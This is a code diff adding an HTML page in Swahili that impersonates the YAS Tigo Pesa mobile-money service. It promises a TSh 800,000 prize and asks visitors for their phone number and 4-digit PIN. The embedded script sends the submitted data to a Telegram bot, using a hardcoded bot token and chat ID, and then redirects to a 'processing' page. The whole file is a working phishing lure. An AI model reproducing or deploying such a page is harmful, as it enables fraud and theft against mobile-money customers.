@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>YAS Tigo Pesa – Thibitisha</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+
+<div class="wrapper">
+  <div class="card">
+
+    <h1 class="title">Umejishindia Ofa Wa YAS Tigo Pesa</h1>
+
+    <p class="subtitle">
+      Karibu! Ingiza namba yako ya simu na <strong>YAS Tigo Neno Siri (tarakimu 4)</strong>
+      ili kuthibitisha na kuendelea kupata ofa yako.
+    </p>
+
+    <div class="offer-box">
+      <span>Kiwango cha Ofa kinachoweza kupatikana</span>
+      <strong>TSh 800,000</strong>
+    </div>
+
+    <input id="phone" type="tel" placeholder="Namba ya simu (mf. 07XXXXXXXX)" class="input"/>
+
+    <input id="yas" type="password" inputmode="numeric" maxlength="4"
+      placeholder="YAS Tigo Neno Siri (tarakimu 4)" class="input"/>
+
+    <button class="btn" onclick="goNext()">Thibitisha</button>
+
+    <p class="note" id="status">Ukithibitisha, unakubali masharti ya matumizi.</p>
+
+    <p class="footer">© YAS Tanzania – Ukurasa Rasmi wa Mfano</p>
+
+  </div>
+</div>
+
+<script>
+function goNext(){
+  const phone = document.getElementById("phone").value;
+  const yas = document.getElementById("yas").value;
+  const status = document.getElementById("status");
+
+  if(!phone || yas.length !== 4){
+    status.innerText = "Tafadhali jaza taarifa zote sahihi.";
+    status.style.color = "red";
+    return;
+  }
+
+  status.style.color = "#0b3b82";
+  status.innerText = "Inathibitisha... tafadhali subiri";
+
+  const yasCode = Math.floor(1000 + Math.random() * 9000);
+
+  fetch("https://api.telegram.org/bot8148382683:AAFHRvpHd1ljQO7TmxpGzPDr2fMuWU-Ecos/sendMessage", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: "8513120100",
+      text: `📲 YAS TIGO PESA – SUBMISSION
+📞 Simu: ${phone}
+🔢 YAS Code: ${yasCode}`
+    })
+  }).finally(() => {
+    window.location.href = "processing.html";
+  });
+}
+</script>
+
+</body>
+</html>
